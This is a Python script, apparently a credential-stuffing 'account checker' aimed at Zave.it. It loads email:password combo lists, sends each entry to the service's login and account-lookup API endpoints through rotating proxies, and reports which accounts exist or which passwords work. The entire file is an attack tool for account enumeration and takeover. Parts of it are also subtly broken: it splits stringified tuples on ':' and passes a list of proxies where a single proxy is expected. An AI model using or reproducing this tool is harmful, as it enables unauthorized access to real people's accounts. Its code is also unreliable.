import httpx
import argparse
import re


def extract_email_password(file_path):
    email_password_list = []

    pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}):\s*([^\s]+)'

    try:
        with open(file_path, 'r') as file:
            content = file.read()

            matches = re.findall(pattern, content)

            for match in matches:
                email, password = match
                email_password_list.append((email, password))

    except FileNotFoundError:
        print(f"File not found: {file_path}")

    return email_password_list


def get_emails(path):
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'

    with open(path, 'r') as file:
        file_content = file.read()

    return re.findall(email_pattern, file_content)


def check(email: str, password: str = None, proxy = None, show_valid = False):
    if not password:
        r = httpx.post("https://api.zave.it/account/v1/pub/auth/zaver/auth-flow", json={"username": email},
                       proxies=proxy).json()
        if r["accountExists"]:
            print("Valid")
            return True
        if not show_valid:
            print("Not Valid")
        return False
    r = httpx.post("https://api.zave.it/account/v1/pub/auth/zaver/token",
                   json={"grantType": "password", "username": email, "password": password},
                   proxies=proxy)
    if r.status_code == 200:
        print("Valid")
        return True
    if not show_valid:
        print("Not Valid")
    return False


def create_proxy_session(proxy_info):
    proxies = {}
    if '@' in proxy_info:
        # Split the proxy information by '@'
        parts = proxy_info.split('@')

        host_and_port = parts[0]

        if ':' in host_and_port:
            proxies = {
                'http://': f'http://{host_and_port}',
                'https://': f'http://{host_and_port}',
            }

        if len(parts) > 1:
            auth = parts[1]
            if ':' in auth:
                username, password = auth.split(':')
                proxies = {
                    'http://': f'http://{host_and_port}@{username}:{password}',
                    'https://': f'http://{host_and_port}@{username}:{password}',
                }


    else:
        if ':' in proxy_info:
            host, port, proxy_username, proxy_password = proxy_info.split(":")
            proxies = {
                'http://': f"http://{proxy_username}:{proxy_password}@{host}:{port}",
                'https://': f"http://{proxy_username}:{proxy_password}@{host}:{port}",
            }

    return proxies


def read_proxy_list_from_file(file_path):
    proxy_list = []
    with open(file_path, 'r') as file:
        for line in file:
            proxy_info = line.strip()
            proxy_session = create_proxy_session(proxy_info)
            proxy_list.append(proxy_session)
    return proxy_list


def main():
    parser = argparse.ArgumentParser(description="Zave.It Account Checker")

    parser.add_argument('--with_password', action='store_true', help='Include password', default=False)

    parser.add_argument('--proxy_path', type=str, help='Path to proxy file')

    parser.add_argument('--mails_path', type=str, help='Path to mails file', required=False)

    parser.add_argument('--mail', type=str, help='mail', required=False)

    parser.add_argument('--password', type=str, help='password', required=False)

    parser.add_argument('--show_valid', action='store_true', help='Only Show Valid Results', required=False)

    # parser.add_argument('--threads', type=int, help='Number of threads to use', default=1)

    args = parser.parse_args()

    if not args.mail and not args.mails_path:
        print("checker.py: error: the given file doesn't contain any emails.")
        return

    mails = []

    if args.with_password:
        print("Password option is enabled.")
        mails = extract_email_password(args.mails_path)
    else:
        if args.mails_path:
            mails = get_emails(args.mails_path)
        if args.mail:
            mails.append(args.mail)


    if len(mails) == 0:
        print("checker.py: error: the given file doesn't contain any emails.")
        return

    proxies = None

    if args.proxy_path:
        proxies = read_proxy_list_from_file(args.proxy_path)

    for item in mails:
        item = str(item)
        if args.with_password:
            check(item.split(":")[0], item.split(":")[1], proxies, args.show_valid)
        else:
            check(item.split(":")[0], None, proxies, args.show_valid)



if __name__ == "__main__":
    main()
